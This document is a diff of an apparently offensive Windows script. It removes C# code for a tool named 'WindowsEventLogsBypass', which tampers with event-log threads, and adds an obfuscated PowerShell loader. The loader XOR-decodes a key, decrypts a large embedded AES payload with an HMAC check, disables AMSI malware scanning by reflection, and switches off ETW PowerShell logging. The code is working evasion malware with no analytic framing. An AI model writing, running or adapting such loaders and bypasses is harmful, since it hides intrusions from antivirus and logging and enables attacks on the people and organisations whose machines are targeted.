@@ -1,393 +1,50 @@
-$csharpCode = @'
-using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
+$tqFf01aEn7aKK = "57,67;202,162;19,73;45,29;153,216;146,227;188,241;197,177;15,62;171,207;177,254;72,1;200,158;222,173;71,127;58,85;174,232;75,62;139,220;71,42;49,114;251,151;121,30;81,5;229,131;77,8;44,31;53,119;13,65;36,116;112,0;115,11".Split(';') | % { $p=$_.Split(','); [byte]([int]$p[0] -bxor [int]$p[1]) }
+$R3j153kZ1GWUuk22C = [Text.Encoding]::UTF8.GetString($tqFf01aEn7aKK)
+$opF1043y = [Convert]::FromBase64String('462Qbk2Oc7/03+zWwugSlWURkutTHKd/Xa3Lb5RJr2g=')
+$derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes([Text.Encoding]::UTF8.GetBytes($R3j153kZ1GWUuk22C), $opF1043y, 100000, [System.Security.Cryptography.HashAlgorithmName]::SHA512)
+$km = $derive.GetBytes(64); $derive.Dispose()
+$GqrEG41emk4 = $km[0..31]; $jvv1NXmfepzxCK8r809 = $km[32..63]
+$PAVUQweWiBsV = @('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','OeIDvslQNn5z1cBWaB2NZyq1mE+qrb+x')
+$encB64 = $PAVUQweWiBsV -join ''
+$qIKz3lfHJibqSvHjj = [Convert]::FromBase64String($encB64)
+$S6q6755jy = $qIKz3lfHJibqSvHjj[0..15]
+$fGvuQYDoKKh8U708A8C3 = $qIKz3lfHJibqSvHjj[16..($qIKz3lfHJibqSvHjj.Length - 33)]
+$vf4P8ozNs = $qIKz3lfHJibqSvHjj[($qIKz3lfHJibqSvHjj.Length - 32)..($qIKz3lfHJibqSvHjj.Length - 1)]
+$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$jvv1NXmfepzxCK8r809)
+$test = $hmac.ComputeHash($S6q6755jy + $fGvuQYDoKKh8U708A8C3); $hmac.Dispose()
+for ($i = 0; $i -lt 32; $i++) { if ($test[$i] -ne $vf4P8ozNs[$i]) { $null = 1/0 } }
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.KeySize = 256; $aes.Key = $GqrEG41emk4; $aes.IV = $S6q6755jy
+$dec = $aes.CreateDecryptor()
+$Zj9a395V33iRuwfh33V = $dec.TransformFinalBlock($fGvuQYDoKKh8U708A8C3, 0, $fGvuQYDoKKh8U708A8C3.Length); $aes.Dispose()
+$nHfBvVG41p80C4 = [BitConverter]::ToUInt32($Zj9a395V33iRuwfh33V[0..3], 0)
+if ($nHfBvVG41p80C4 -ne 2895992422) { $null = 1/0 }
 
-namespace WindowsEventLogsBypass
-{
-    public class Program
-    {
-        private const Int32 ANYSIZE_ARRAY = 1;
-        private const UInt32 TOKEN_QUERY = 0x0008;
-        private const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
-        private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
-        private const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
-        public static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
-    
-        [DllImport("advapi32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool AdjustTokenPrivileges(
-            IntPtr TokenHandle,
-            [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
-            ref TOKEN_PRIVILEGES NewState,
-            UInt32 BufferLengthInBytes,
-            IntPtr PreviousState,
-            out UInt32 ReturnLengthInBytes
-        );
+$z01QC4XHT9 = @(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)
+$iswuAeK79REh = @(97,109,115,105,73,110,105,116,70,97,105,108,101,100)
+$CWEKI61CR3Dan5a = @(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114)
+$LGm1fv0iiQYb = @(109,95,101,110,97,98,108,101,100)
+$AmsiType = [Ref].Assembly.GetType((-join ($z01QC4XHT9 | % { [char]$_ })))
+$AmsiField = $AmsiType.GetField((-join ($iswuAeK79REh | % { [char]$_ })),'NonPublic,Static')
+$AmsiField.SetValue($null,$true)
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool OpenProcessToken(
-            IntPtr ProcessHandle, 
-            UInt32 DesiredAccess, 
-            out IntPtr TokenHandle
-        );
+try {
+    $EtwType = [Ref].Assembly.GetType((-join ($CWEKI61CR3Dan5a | % { [char]$_ })))
+    $EtwField = $EtwType.GetField((-join ($LGm1fv0iiQYb | % { [char]$_ })),'NonPublic,Static')
+    $EtwProv = $EtwField.GetValue($null)
+    $EtwProv.GetType().GetField((-join ($LGm1fv0iiQYb | % { [char]$_ })),'NonPublic,Instance').SetValue($EtwProv,0)
+} catch {}
+try {
+    $m = $EtwType.GetMethod('SetProviderEnabled',[System.Reflection.BindingFlags]'NonPublic,Instance')
+    $m.Invoke($EtwProv,@($false))
+} catch {}
 
-        [DllImport("advapi32.dll")]
-        static extern bool LookupPrivilegeValue(
-            string lpSystemName, 
-            string lpName,
-            ref long lpLuid
-        );
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern ulong I_QueryTagInformation(
-            IntPtr MachineName,
-            SC_SERVICE_TAG_QUERY_TYPE InfoLevel,
-            ref _SC_SERVICE_TAG_QUERY TagInfo
-        );
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr GetCurrentProcess();
-
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
-        static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);
-
-        [DllImport("kernel32.dll")]
-        static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);
-
-        [DllImport("kernel32.dll")]
-        public static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool CloseHandle(IntPtr hObject);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr OpenProcess(
-            uint processAccess,
-            bool bInheritHandle,
-            IntPtr processId
-        );
-
-        [DllImport("kernel32.dll")]
-        public static extern void RtlZeroMemory(
-            IntPtr pBuffer,
-            int length
-        );
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern int SuspendThread(IntPtr hThread);
-
-        [DllImport("ntdll.dll")]
-        public static extern UInt32 NtQueryInformationThread(
-            IntPtr handle, 
-            uint infclass, 
-            ref THREAD_BASIC_INFORMATION info, 
-            uint length,
-            UInt32 bytesread
-        );
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        static extern Boolean NtReadVirtualMemory(
-            IntPtr ProcessHandle,
-            IntPtr BaseAddress,
-            IntPtr Buffer,
-            UInt64 NumberOfBytesToRead,
-            ref UInt64 liRet
-        );
-
